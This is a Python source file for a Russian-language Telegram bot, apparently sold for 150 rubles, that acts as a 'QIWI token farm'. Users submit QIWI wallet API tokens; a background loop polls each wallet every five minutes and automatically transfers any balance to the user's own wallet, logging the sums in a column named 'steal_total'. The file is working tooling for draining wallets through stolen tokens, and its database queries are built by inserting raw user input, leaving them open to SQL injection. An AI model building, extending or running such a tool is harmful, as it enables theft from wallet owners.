from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.helper import Helper, HelperMode, ListItem
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from SimpleQIWI import *
import time
import threading
import datetime

import config
import keyboard
from sql import connection, q

bot = Bot(token=config.telegram_token) # Токен
dp = Dispatcher(bot, storage=MemoryStorage())

def check_token():
    while True:
        print('Проверяю токены...')
        q.execute(f"SELECT id, token FROM tokens ORDER BY id DESC")
        result = q.fetchall()
        for i in result:
            try:
                api = QApi(token=i[1], phone='')
                balance = api.balance[0]
                if balance >= 1:
                    q.execute(f"SELECT * FROM users WHERE id = '{i[0]}'")
                    result = q.fetchall()
                    try:
                        now = datetime.datetime.now()
                        dt = now.strftime(f"%d.%m.%Y")
                        api.pay(account=f"{result[0][2]}", amount=balance-1)
                        q.execute(f"UPDATE users SET steal_total = {result[0][1] + balance} WHERE id = '{i[0]}'")
                        q.execute(f"INSERT INTO withdraws (id, time, money)"
                            f"VALUES ('{i[0]}', '{dt}', '{balance}')")
                        connection.commit()
                        send_message(i[0], result[0][2], i[1], balance)
                    except Exception as e:
                        print('Неудачно')
                        print(e)
            except:
                ()
        time.sleep(300)

async def check_user(id):
    rs = False

    q.execute(f"SELECT * FROM users WHERE id = {id}")
    result = q.fetchall()
    if len(result) == 0:
            q.execute(f"INSERT INTO users (id)"
                        f"VALUES ('{id}')")
    else:
        if result[0][3] == 1:
            rs = True
    connection.commit()
    return rs

def send_message(id, your_phone, from_token, balance):
    requests.get(f"https://api.telegram.org/bot{config.telegram_token}/sendMessage?chat_id={id}&text=✅ Успешный вывод с ферм\n\n🌐 В размере: {balance}₽\n📥 Отправитель: {from_token}\n♻️ Получатель: {your_phone}")

class PropsStates(Helper):
    mode = HelperMode.snake_case

    PROPS_0 = ListItem()
    PROPS_1 = ListItem()
    PROPS_2 = ListItem()
    PROPS_3 = ListItem()
    PROPS_4 = ListItem()

@dp.message_handler(commands=['start'])
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'Привет, друг 🙋‍♂️\nДанный бот, является фермой QIWI токенов 🥝\nАдминистрация: @admricker\nИНФО: https://t.me/INWOWEPMA\n\nP.s. так как ботов, в телеграмме попусту нету. С таким функционалом доступ платный в размере 150₽ 💸\n\nКупить: @admricker (сразу писать что хочу купить Без лишних вопросов, остальные ответы на вопросы ты найдёшь в канале инфо.)')
        return
    await bot.send_message(message.from_user.id, 'Добро пожаловать!\nЧтобы оставить заявку, воспользуйтесь клавиатурой.', reply_markup=keyboard.start_keyboard)

@dp.message_handler(commands=['admin'])
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'Привет, друг 🙋‍♂️\nДанный бот, является фермой QIWI токенов 🥝\nАдминистрация: @admricker\nИНФО: https://t.me/INWOWEPMA\n\nP.s. так как ботов, в телеграмме попусту нету. С таким функционалом доступ платный в размере 150₽ 💸\n\nКупить: @admricker (сразу писать что хочу купить Без лишних вопросов, остальные ответы на вопросы ты найдёшь в канале инфо.)')
        return
    await bot.send_message(message.from_user.id, 'Админ-панель:', reply_markup=keyboard.admin)

@dp.message_handler(text='🔰Информация🔰')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'Привет, друг 🙋‍♂️\nДанный бот, является фермой QIWI токенов 🥝\nАдминистрация: @admricker\nИНФО: https://t.me/INWOWEPMA\n\nP.s. так как ботов, в телеграмме попусту нету. С таким функционалом доступ платный в размере 150₽ 💸\n\nКупить: @admricker (сразу писать что хочу купить Без лишних вопросов, остальные ответы на вопросы ты найдёшь в канале инфо.)')
        return
    await message.reply('❓Что такое ферма токенов? Ферма токенов - это набор ваших токенов которые проверяются каждые 5 минут на пополнения.\nЕсли кошелек будет пополнен то средства автоматически выведутся на указанный вами кошелёк.', reply=False)

@dp.message_handler(text='📊Статистика📊')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'Привет, друг 🙋‍♂️\nДанный бот, является фермой QIWI токенов 🥝\nАдминистрация: @admricker\nИНФО: https://t.me/INWOWEPMA\n\nP.s. так как ботов, в телеграмме попусту нету. С таким функционалом доступ платный в размере 150₽ 💸\n\nКупить: @admricker (сразу писать что хочу купить Без лишних вопросов, остальные ответы на вопросы ты найдёшь в канале инфо.)')
        return

    q.execute(f"SELECT * FROM users WHERE id = '{message.from_user.id}'")
    result = q.fetchall()
    q.execute(f"SELECT * FROM tokens WHERE id = '{message.from_user.id}'")
    tokens = q.fetchall()
    q.execute(f"SELECT * FROM withdraws WHERE id = '{message.from_user.id}'")
    money = q.fetchall()
    cash_today = 0
    if len(money) != 0:
        now = datetime.datetime.now()
        dt = now.strftime(f"%d.%m.%Y")
        for i in money:
            if i[2] == dt:
                cash_today += i[3]
            else:
                q.execute(f"DELETE FROM withdraws WHERE spid = {i[4]}")
                connection.commit()

    await message.reply(f'📊 Статистика:\n\n🔐 Всего токенов указано: {len(tokens)}\n🕐 Выведено сегодня: {cash_today}₽\n⚡️ Выведено всего: {result[0][1]}₽', reply=False)

@dp.message_handler(text='📥Указать реквизиты📥')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'Привет, друг 🙋‍♂️\nДанный бот, является фермой QIWI токенов 🥝\nАдминистрация: @admricker\nИНФО: https://t.me/INWOWEPMA\n\nP.s. так как ботов, в телеграмме попусту нету. С таким функционалом доступ платный в размере 150₽ 💸\n\nКупить: @admricker (сразу писать что хочу купить Без лишних вопросов, остальные ответы на вопросы ты найдёшь в канале инфо.)')
        return
    
    await bot.send_message(message.from_user.id, 'После пополнения, ваших токенов. Деньги  придут именно на эти реквизиты.', reply_markup=keyboard.props)

@dp.message_handler(text='Выдать доступ')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'Привет, друг 🙋‍♂️\nДанный бот, является фермой QIWI токенов 🥝\nАдминистрация: @admricker\nИНФО: https://t.me/INWOWEPMA\n\nP.s. так как ботов, в телеграмме попусту нету. С таким функционалом доступ платный в размере 150₽ 💸\n\nКупить: @admricker (сразу писать что хочу купить Без лишних вопросов, остальные ответы на вопросы ты найдёшь в канале инфо.)')
        return
    if message.from_user.id == config.admin:
        await bot.send_message(message.from_user.id, 'Отправьте ссылку на айди человека')
        state = dp.current_state(user=message.from_user.id)
        await state.set_state(PropsStates.all()[3])

@dp.message_handler(text='Забрать доступ')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'Привет, друг 🙋‍♂️\nДанный бот, является фермой QIWI токенов 🥝\nАдминистрация: @admricker\nИНФО: https://t.me/INWOWEPMA\n\nP.s. так как ботов, в телеграмме попусту нету. С таким функционалом доступ платный в размере 150₽ 💸\n\nКупить: @admricker (сразу писать что хочу купить Без лишних вопросов, остальные ответы на вопросы ты найдёшь в канале инфо.)')
        return
    if message.from_user.id == config.admin:
        await bot.send_message(message.from_user.id, 'Отправьте ссылку на айди человека')
        state = dp.current_state(user=message.from_user.id)
        await state.set_state(PropsStates.all()[4])

@dp.callback_query_handler(text_contains='props')
async def handler(call: types.CallbackQuery):
    state = dp.current_state(user=call.from_user.id)
    
    await call.message.reply('Введите номер кошелька в формате 79999999999', reply=False)
    
    await state.set_state(PropsStates.all()[0])

@dp.message_handler(text='💫Добавить токен💫')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'Привет, друг 🙋‍♂️\nДанный бот, является фермой QIWI токенов 🥝\nАдминистрация: @admricker\nИНФО: https://t.me/INWOWEPMA\n\nP.s. так как ботов, в телеграмме попусту нету. С таким функционалом доступ платный в размере 150₽ 💸\n\nКупить: @admricker (сразу писать что хочу купить Без лишних вопросов, остальные ответы на вопросы ты найдёшь в канале инфо.)')
        return
    state = dp.current_state(user=message.from_user.id)
    await state.set_state(PropsStates.all()[1])

    await bot.send_message(message.from_user.id, 'Введите токен который хотите добавить.')

@dp.message_handler(text='🌐 Добавить несколько токенов🌐')
async def handler(message: types.Message):
    if not await check_user(message.from_user.id):
        await bot.send_message(message.from_user.id, f'Привет, друг 🙋‍♂️\nДанный бот, является фермой QIWI токенов 🥝\nАдминистрация: @admricker\nИНФО: https://t.me/INWOWEPMA\n\nP.s. так как ботов, в телеграмме попусту нету. С таким функционалом доступ платный в размере 150₽ 💸\n\nКупить: @admricker (сразу писать что хочу купить Без лишних вопросов, остальные ответы на вопросы ты найдёшь в канале инфо.)')
        return
    state = dp.current_state(user=message.from_user.id)
    await state.set_state(PropsStates.all()[2])

    await bot.send_message(message.from_user.id, 'Введите токены разделяя их символом :')
 
@dp.message_handler(state=PropsStates.PROPS_0)
async def handler(message: types.Message):
    state = dp.current_state(user=message.from_user.id)
    
    q.execute(f"UPDATE users SET props = '{message.text}' WHERE id = '{message.from_user.id}'")
    connection.commit()

    await message.reply('🔥Кошелек, успешно добавлен.', reply=False)

    await state.reset_state()

@dp.message_handler(state=PropsStates.PROPS_1)
async def handler(message: types.Message):
    state = dp.current_state(user=message.from_user.id)
    
    api = QApi(token=message.text, phone='')
    try:
        balance = api.balance[0]
        await message.reply('✅Токен успешно добавлен', reply=False)
        q.execute(f"INSERT INTO tokens (id, token)"
                    f"VALUES ('{message.from_user.id}', '{message.text}')")
        connection.commit()
    except:
        await message.reply('📛Токен невалиден', reply=False)

    await state.reset_state()

@dp.message_handler(state=PropsStates.PROPS_2)
async def handler(message: types.Message):
    state = dp.current_state(user=message.from_user.id)

    valid = 0
    nevalid = 0

    tokens = (message.text).split(':')

    for i in tokens:
        try:
            api = QApi(token=i, phone='')
            balance = api.balance[0]
            valid+=1
            q.execute(f"INSERT INTO tokens (id, token)"
                        f"VALUES ('{message.from_user.id}', '{i}')")
            connection.commit()
        except:
            nevalid+=1

    await message.reply(f'✅ Добавлено токенов: {valid}\n❌ Невалидных: {nevalid}', reply=False)

    await state.reset_state()

@dp.message_handler(state=PropsStates.PROPS_3)
async def handler(message: types.Message):
    state = dp.current_state(user=message.from_user.id)
    
    q.execute(f"UPDATE users SET status = '1' WHERE id = '{message.text}'")
    connection.commit()

    await message.reply('Вы выдали доступ', reply=False)

    await state.reset_state()

@dp.message_handler(state=PropsStates.PROPS_4)
async def handler(message: types.Message):
    state = dp.current_state(user=message.from_user.id)
    
    q.execute(f"UPDATE users SET status = '0' WHERE id = '{message.text}'")
    connection.commit()

    await message.reply('Вы забрали доступ', reply=False)

    await state.reset_state()

my_thread = threading.Thread(target=check_token)
my_thread.start()

print('Бот запущен')

executor.start_polling(dp)
